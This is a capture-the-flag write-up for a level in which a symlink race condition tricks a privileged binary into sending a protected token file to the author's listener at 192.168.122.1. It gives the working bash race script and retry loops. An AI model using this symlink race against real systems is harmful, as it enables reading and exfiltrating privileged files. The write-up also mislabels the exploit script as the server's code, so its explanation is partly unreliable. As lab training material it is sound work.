# Level10 Write-up

## Objective:

The goal of this level was to establish a server, exploit a vulnerability to gain access, and retrieve the flag.

## Step-by-step process:

### Step 1: Compiling a Miniserver

The first step was to compile a `miniserv.c` file to create an executable:

```bash
cc miniserv.c -o a.out
```

### Step 2: Running the Server

Next, I ran the compiled server in a loop using the following command:

```bash
while true; do ./a.out; done
```

This continuously ran the server, keeping it alive for further exploitation.

### Step 3: Analyzing the Vulnerability

Upon inspecting the code, I noticed that it opened a connection and used a temporary file (`/tmp/test`). The server appeared to be vulnerable to symbolic link attacks or file manipulation. The relevant part of the code was:

```bash
#!/bin/bash

rm /tmp/test
touch /tmp/test
/home/user/level10/level10 /tmp/test 192.168.122.1 & rm /tmp/test && ln -s /home/user/level10/token /tmp/test
```

### Step 4: Exploiting the Vulnerability

I exploited this by using a combination of commands. The goal was to create the necessary symbolic link and ensure that the server was triggered correctly.

First, I created the necessary `script.sh` file that would continuously run and trigger the vulnerability:

```bash
while true; do /tmp/script.sh; done
```

This would execute the necessary steps in the background, creating a symbolic link from `/tmp/test` to `/home/user/level10/token`.

### Step 5: Triggering the Vulnerability and Retrieving the Flag

Once the exploit was in place, the server accepted the connection, and I was able to access the `token` file through the symbolic link and retrieve the flag.
